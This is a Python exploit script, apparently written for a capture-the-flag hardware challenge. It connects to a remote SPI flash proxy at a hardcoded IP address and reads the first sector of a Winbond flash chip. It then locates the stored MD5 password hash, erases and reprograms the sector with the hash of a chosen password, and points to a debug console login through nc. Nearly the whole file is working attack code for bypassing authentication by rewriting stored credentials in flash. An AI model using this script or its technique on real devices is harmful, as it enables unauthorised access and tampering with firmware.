
import socket
import json
import time
import hashlib
import sys
from typing import List, Optional, Tuple

# ------------ CONFIG (edit if needed) ------------
HOST = "83.136.253.59"   # Flash access server
PORT = 56467             # Flash port (SPI proxy)
CS_PIN = 0               # /CS on A*BUS3 (per server's API spec)
USB_URL = "ftdi://ftdi:2232h/1"
SECTOR_BASE_ADDR = 0x000000  # Sector 0 for this challenge
SECTOR_SIZE = 4096
PAGE_SIZE = 256
READ_CHUNK = SECTOR_SIZE     # How many bytes to read from base (first sector)
PASSWORD = "diogt"           # New password to set (MD5 will be written)
# -------------------------------------------------

# SPI Flash opcodes (Winbond W25Q128 series)
OP_READ_DATA           = 0x03
OP_READ_STATUS_REG1    = 0x05
OP_WRITE_ENABLE        = 0x06
OP_PAGE_PROGRAM        = 0x02
OP_SECTOR_ERASE_4K     = 0x20
OP_JEDEC_ID            = 0x9F

def _coerce_bytes(resp):
    """
    Server may return a list of ints OR hex-strings like '0xff'.
    Normalize to a list of ints 0..255.
    """
    out = []
    for x in resp:
        if isinstance(x, int):
            out.append(x & 0xFF)
        elif isinstance(x, str):
            # expect like '0xff' or '255'
            try:
                if x.startswith('0x') or x.startswith('0X'):
                    out.append(int(x, 16) & 0xFF)
                else:
                    out.append(int(x) & 0xFF)
            except Exception:
                raise ValueError(f"Unexpected byte format from server: {x!r}")
        else:
            raise ValueError(f"Unexpected response element type: {type(x)} - {x!r}")
    return out

def exchange(hex_list: List[int], readlen: int = 0) -> List[int]:
    """
    Low-level exchange with the remote SPI proxy.
    hex_list: bytes to send (as ints 0..255)
    readlen: number of bytes to read back
    """
    command_data = {
        "tool": "pyftdi",
        "cs_pin": CS_PIN,
        "url": USB_URL,
        "data_out": [hex(x & 0xFF) for x in hex_list],
        "readlen": int(readlen) if readlen else 0,
    }

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)
        s.connect((HOST, PORT))
        s.sendall(json.dumps(command_data).encode("utf-8"))
        data = b""
        # server ends response with a closing ']' for the JSON list payload
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if data.endswith(b']'):
                break
    resp = json.loads(data.decode("utf-8"))
    if not isinstance(resp, list):
        raise RuntimeError(f"Unexpected response (not list): {resp!r}")
    return _coerce_bytes(resp)

def read_jedec_id() -> Tuple[int,int,int]:
    r = exchange([OP_JEDEC_ID], 3)
    if len(r) != 3:
        raise RuntimeError(f"Bad JEDEC ID length: {r}")
    return (r[0], r[1], r[2])

def read_status_reg1() -> int:
    r = exchange([OP_READ_STATUS_REG1], 1)
    if len(r) != 1:
        raise RuntimeError(f"Bad status length: {r}")
    return r[0]

def wait_until_ready(timeout_s: float = 3.0, poll_interval: float = 0.05):
    """
    Poll SR1.WIP bit (bit0) until cleared.
    """
    deadline = time.time() + timeout_s
    while True:
        sr1 = read_status_reg1()
        wip = sr1 & 0x01
        if not wip:
            return
        if time.time() >= deadline:
            raise TimeoutError("Timeout waiting for WIP=0 (device ready).")
        time.sleep(poll_interval)

def write_enable():
    exchange([OP_WRITE_ENABLE], 0)

def read_data(addr: int, nbytes: int) -> List[int]:
    a2 = (addr >> 16) & 0xFF
    a1 = (addr >> 8) & 0xFF
    a0 = addr & 0xFF
    return exchange([OP_READ_DATA, a2, a1, a0], nbytes)

def sector_erase_4k(addr: int):
    a2 = (addr >> 16) & 0xFF
    a1 = (addr >> 8) & 0xFF
    a0 = addr & 0xFF
    write_enable()
    exchange([OP_SECTOR_ERASE_4K, a2, a1, a0], 0)
    wait_until_ready(timeout_s=6.0)  # erases are slower

def page_program(addr: int, data: List[int]):
    if len(data) == 0 or len(data) > PAGE_SIZE:
        raise ValueError("page_program data must be 1..256 bytes")
    a2 = (addr >> 16) & 0xFF
    a1 = (addr >> 8) & 0xFF
    a0 = addr & 0xFF
    write_enable()
    exchange([OP_PAGE_PROGRAM, a2, a1, a0] + [b & 0xFF for b in data], 0)
    wait_until_ready(timeout_s=1.5)

def split_on_nulls(buf: List[int]) -> List[List[int]]:
    entries = []
    cur = []
    for b in buf:
        if b == 0x00:
            if cur:
                entries.append(cur)
                cur = []
        else:
            cur.append(b)
    if cur:
        entries.append(cur)
    return entries

def find_sublist(buf: List[int], needle: List[int]) -> Optional[int]:
    if not needle or len(needle) > len(buf):
        return None
    # simple scan
    for i in range(len(buf) - len(needle) + 1):
        if buf[i:i+len(needle)] == needle:
            return i
    return None

def compute_md5_bytes(s: str) -> List[int]:
    return list(hashlib.md5(s.encode("utf-8")).digest())

def patch_sector_with_new_hash(sector_data: List[int], new_hash: List[int]) -> Tuple[List[int], List[int], int]:
    """
    Find a 16-byte entry (likely the MD5) in sector_data split by nulls,
    then replace it with new_hash. Returns (patched_sector, old_hash, index).
    """
    entries = split_on_nulls(sector_data)
    target = next((e for e in entries if len(e) == 16), None)
    if not target:
        raise RuntimeError("No 16-byte entry found in sector (can't locate MD5).")
    idx = find_sublist(sector_data, target)
    if idx is None:
        raise RuntimeError("Internal error: target sublist not found by index.")
    # Replace in a copy
    patched = sector_data[:]
    patched[idx:idx+16] = new_hash
    return patched, target, idx

def program_sector(base_addr: int, sector_bytes: List[int]):
    if len(sector_bytes) != SECTOR_SIZE:
        raise ValueError(f"Expected {SECTOR_SIZE} bytes for sector programming.")
    # Erase then program each 256-byte page
    print(f"[*] Erasing 4KB sector at 0x{base_addr:06X} ...")
    sector_erase_4k(base_addr)
    print("[*] Programming pages ...")
    for page_no in range(0, SECTOR_SIZE // PAGE_SIZE):
        addr = base_addr + page_no * PAGE_SIZE
        chunk = sector_bytes[page_no*PAGE_SIZE:(page_no+1)*PAGE_SIZE]
        page_program(addr, chunk)
    print("[+] Sector programmed.")

def main():
    # CLI: optional args password and read-only flag
    # Usage:
    # dry-run: read + show the 16-byte candidates, no writes
    # python3 exploit.py --dry-run

    # write default password ("diogt")
    # python3 exploit.py

    # write your own password
    # python3 exploit.py --password "MyNewPass123!"

    # If the patch succeeds, connect to the debug interface on the second port:
    # nc 83.136.253.59 58864
    # enter the password you set (e.g., diogt)

    dry_run = False
    password = PASSWORD
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        a = args[i]
        if a == "--dry-run":
            dry_run = True
            i += 1
        elif a == "--password":
            if i+1 >= len(args):
                print("ERROR: --password requires a value")
                return 2
            password = args[i+1]
            i += 2
        else:
            print(f"Unknown arg: {a}")
            return 2

    print(f"[*] Connecting to {HOST}:{PORT}")
    jedec = read_jedec_id()
    print(f"[+] JEDEC ID: {jedec[0]:02X} {jedec[1]:02X} {jedec[2]:02X}")

    print(f"[*] Reading sector @ 0x{SECTOR_BASE_ADDR:06X} ({SECTOR_SIZE} bytes) ...")
    sector = read_data(SECTOR_BASE_ADDR, SECTOR_SIZE)
    print(f"[+] Read {len(sector)} bytes.")

    # Show all 16-byte entries discovered
    entries = split_on_nulls(sector)
    md5_candidates = [e for e in entries if len(e) == 16]
    if not md5_candidates:
        print("[-] No 16-byte entries found. Exiting.")
        return 1

    print(f"[*] Found {len(md5_candidates)} 16-byte candidate(s). Showing as hex:")
    for idx, e in enumerate(md5_candidates, 1):
        print(f"    #{idx}: " + ''.join(f"{b:02x}" for b in e))

    # Use the first 16-byte candidate (as per challenge writeup)
    old_hash = md5_candidates[0]
    index_in_sector = find_sublist(sector, old_hash)
    print(f"[*] Selected candidate index in sector: {index_in_sector}")
    print(f"[*] Old hash: {''.join(f'{b:02x}' for b in old_hash)}")

    new_hash = compute_md5_bytes(password)
    print(f"[*] New hash for password '{password}': {''.join(f'{b:02x}' for b in new_hash)}")

    if dry_run:
        print("[DRY-RUN] Not writing anything. Exiting.")
        return 0

    patched, old_hash_confirm, idx = patch_sector_with_new_hash(sector, new_hash)
    if idx != index_in_sector or old_hash_confirm != old_hash:
        print("[-] Sanity check failed before programming. Aborting.")
        return 1

    program_sector(SECTOR_BASE_ADDR, patched)
    print("[+] Done. You can now try logging into the debug interface on the second port with the chosen password.")

if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        sys.exit(1)
